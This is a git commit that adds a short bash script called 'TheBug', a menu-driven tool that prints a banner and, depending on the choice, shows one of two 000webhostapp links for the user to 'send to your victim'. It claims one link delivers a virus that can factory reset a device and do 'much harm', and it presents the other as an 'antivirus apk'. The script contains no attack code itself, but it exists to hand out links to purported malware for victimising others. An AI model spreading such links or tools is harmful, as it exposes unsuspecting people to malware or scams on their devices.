a64d9b6d3b6323b37b458ec4ebfa09a018ca953c
Bishal Singh <60428430+Anon4You@users.noreply.github.com>
2020-03-09 03:36:47 +0530

    Create .mk

---
+++ .mk
@@ -0,0 +1,56 @@
+#A tool By BISHAL SINGH
+echo "
+           @@@@@@@@@@@@@@@@@@@
+         @@@@@@@@@@@@@@@@@@@@@@@
+       @@@@@@@@@@@@@@@@@@@@@@@@@@@
+     @@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+    @@@@@@@@@@@@@@@/      \@@@/   @
+   @@@@@@@@@@@@@@@@\      @@  @___@
+   @@@@@@@@@@@@@ @@@@@@@@@@  | \@@@@@
+   @@@@@@@@@@@@@ @@@@@@@@@\__@_/@@@@@
+    @@@@@@@@@@@@@@@/,/,/./'/_|.\'\,\ \
+
+      @@@@@@@@@@@@@|  | | | | | | | |
+                    \_|_|_|_|_|_|_|_|
+ _______________________________________
+  >>>>>>>>>>>>>>[TheBug]<<<<<<<<<<<<<<
+  ______________________________________ "|lolcat
+  echo " "
+  echo '             A tool By Anon4You'|lolcat
+  echo " "
+echo $'\033[33m'"            Enter 1 For"$'\033[31m'" Virus"
+echo $'\033[33m'"            Enter 2 For"$'\033[32m'" AntiVirus"
+echo $'\033[33m'"            Enter 0 For"$'\033[37m'" Exit"
+echo " "
+echo $'\033[35m'"  "
+read -p "Bug>> " pil
+echo 
+if [ $pil = 1 ]
+then
+clear
+figlet -f slant "wait....."|lolcat
+clear
+echo " "
+echo ' Copy below link and send to your victim
+  this virus can do factory reset and many much harm'|lolcat
+  echo " "
+  echo 'LINK-     https://sysubdatezz.000webhostapp.com '
+
+ echo " "
+ figlet -f slant "Bye Bye"|lolcat
+fi
+
+echo
+echo
+if [ $pil = 2 ]
+then
+clear
+figlet -f slant "wait...."|lolcat
+clear
+echo 'copy below link and send to your victim
+           it is a antivirus apk '|lolcat
+           echo " "
+           echo 'LINK-     https://saverzzs.000webhostapp.com'
+          echo " "
+          figlet -f slant "Bye Bye"|lolcat
+fi 
